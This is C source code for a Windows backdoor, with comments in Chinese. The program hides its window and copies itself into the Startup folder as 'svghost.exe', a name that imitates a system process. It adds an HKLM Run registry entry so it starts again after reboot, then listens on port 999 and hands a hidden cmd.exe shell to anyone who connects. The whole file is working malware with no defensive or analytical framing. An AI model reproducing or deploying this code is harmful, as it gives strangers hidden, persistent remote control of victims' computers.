\n#pragma comment(lib,\"ws2_32.lib\")\n//设置连接器选项\n#pragma comment(linker,\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n#include \u003Cwinsock2.h>\n#include\u003Cwindows.h>\n#include\u003Cstdio.h>\n#define MasterPort 999 //定义监听端口\n\nvoid open_telnet(){\n\tWSADATA WSADa;//用来存储被WSAStartup函数调用后返回的win sockets数据\n\tsockaddr_in SockAddrin;\n\tSOCKET CSocket, SSocket;\n\tint AddrSize;\n\tPROCESS_INFORMATION Processinfo;\n\tSTARTUPINFO Startupinfo;\n\tchar szCMDPath[255];\n\n\t//配内存资源，初始化数据\n\tZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));\n\tZeroMemory(&Startupinfo, sizeof(STARTUPINFO));\n\tZeroMemory(&WSADa, sizeof(WSADATA));\n\n\t//获取CMD路径\n\tGetEnvironmentVariable(\"COMSPEC\", szCMDPath, sizeof(szCMDPath));\n\n\t//加载ws2_32.dll\n\tWSAStartup(0x202, &WSADa);\n\n\t//设置本地信息和绑定协议，建立socket\n\tSockAddrin.sin_family = AF_INET;\n\tSockAddrin.sin_addr.s_addr = INADDR_ANY;\n\tSockAddrin.sin_port = htons(MasterPort);\n\tCSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\n\t//设置绑定断端口999\n\tbind(CSocket, (sockaddr*)&SockAddrin, sizeof(SockAddrin));\n\n\t//设置服务器监听端口\n\tlisten(CSocket, 1);\n\tAddrSize = sizeof(SockAddrin);\n\n\t//开始连接远程服务器，并配置隐藏窗口结构体\n\tSSocket = accept(CSocket, (sockaddr*)&SockAddrin, &AddrSize);\n\tStartupinfo.cb = sizeof(STARTUPINFO);\n\tStartupinfo.wShowWindow = SW_HIDE;\n\tStartupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;\n\tStartupinfo.hStdInput = (HANDLE)SSocket;\n\tStartupinfo.hStdOutput = (HANDLE)SSocket;\n\tStartupinfo.hStdError = (HANDLE)SSocket;\n\n\t//创建匿名管道\n\tCreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo);\n\tWaitForSingleObject(Processinfo.hProcess, INFINITE);\n\tCloseHandle(Processinfo.hProcess);\n\tCloseHandle(Processinfo.hThread);\n\n\t//关闭进程句柄\n\tclosesocket(CSocket);\n\tclosesocket(SSocket);\n\tWSACleanup();\n    //关闭连接卸载ws2_32.dll\n}\n\n\nint regedit(HKEY key, const char* reg_name, const char* key_name, const char* key_value)\n{\n\tHKEY hkResult;  \n\tint ret=RegOpenKeyEx(key, reg_name, 0, KEY_ALL_ACCESS, &hkResult);\n\n\tif(ret != 0)\n\t\treturn ret;\n\n\tret=RegSetValueEx(hkResult, key_name, 0, REG_EXPAND_SZ, (CONST BYTE*)key_value, 75);\n\n\tif(ret==0)\n\t{  \n\t\tRegCloseKey(hkResult);\n\t\treturn 0;\n\t}  \n\telse\n\t{  \n\t\treturn ret;\n\t}\n}\n\nint autopen(const char* key_name, const char* process_path)\n{\n\tchar reg_name[] = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\";\n\treturn regedit(HKEY_LOCAL_MACHINE, reg_name, key_name, process_path);\n}\n\nint main(void)  \n{\n\n\tchar key_name[100];\n\tchar process_path[1024];\n\t///写入启动文件夹\n\tchar FileName[MAX_PATH];//存储程序自身的绝对路径\n\tchar TempPath[MAX_PATH];//存储系统存放路径，主要获取系统盘盘符\n\tchar TempBuffer[MAX_PATH];\n\tGetModuleFileName(NULL,FileName,sizeof(FileName));\n\tGetSystemDirectory(TempPath,sizeof(TempPath));\n\tsprintf(TempBuffer,\"%c%c\\\\Documents and Settings\\\\All Users\\\\「开始」菜单\\\\程序\\\\启动\\\\svghost.exe\",TempPath[0],TempPath[1]);\n\tCopyFile(FileName,TempBuffer,TRUE);  //将程序复制到启动文件夹中\n\t///写入注册表///\n\tGetPrivateProfileStringA(\"Main\", \"KeyName\", \"kinni\", key_name,  sizeof(key_name), \".\\\\config.ini\");\n\tGetPrivateProfileStringA(\"Main\", \"ProcessPath\", \"C:\\\\Documents and Settings\\\\All Users\\\\「开始」菜单\\\\程序\\\\启动\\\\svghost.exe\", process_path,  sizeof(process_path), \".\\\\config.ini\");\t\n\tint ret = autopen(key_name, process_path);\n\topen_telnet();//远程telnet\t\n\treturn 0;  \n} \n\n
